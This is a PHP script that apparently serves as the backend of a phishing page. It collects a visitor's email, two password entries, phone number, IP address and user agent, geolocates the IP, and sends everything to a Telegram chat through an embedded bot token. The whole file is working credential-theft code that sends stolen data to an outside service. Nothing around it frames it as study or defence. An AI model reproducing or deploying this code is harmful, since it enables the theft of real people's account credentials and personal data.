<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $FirstPassword = $_POST['firstPassword'];
    $SecondPassword = $_POST['password'];
    $phone = $_POST['phone'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $url = "https://checkip.vip/api/lookup?_=1702640330039";
    $data = array(
        'ip' => $ipAddress
    );
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $dataArray = json_decode($response, true);
    $country = $dataArray['data']['country'];
    $city = $dataArray['data']['city'];
    $botToken = '6744094756:AAHK2v3LgE0bWm_aqVPvS1RM7OllnWtpkJo';
    $chatId = '-1002061459470';
    $text = "<strong>Email :</strong> $email\n<strong>FirstPassword:</strong> $FirstPassword\n<strong>SecondPassword:</strong> $SecondPassword\n<strong>Phone :</strong> $phone\n<strong>IP :</strong> $ipAddress\n<strong>Country:</strong> $country\n<strong>City :</strong> $city\n<strong>UserAgent :</strong> $userAgent";
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($text) . "&parse_mode=html";

    // Sử dụng cURL để gửi yêu cầu
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $jsonObject = json_decode($response, true);
    $title = $jsonObject['result']['sender_chat']['title'];
    echo $title;
    }
                        
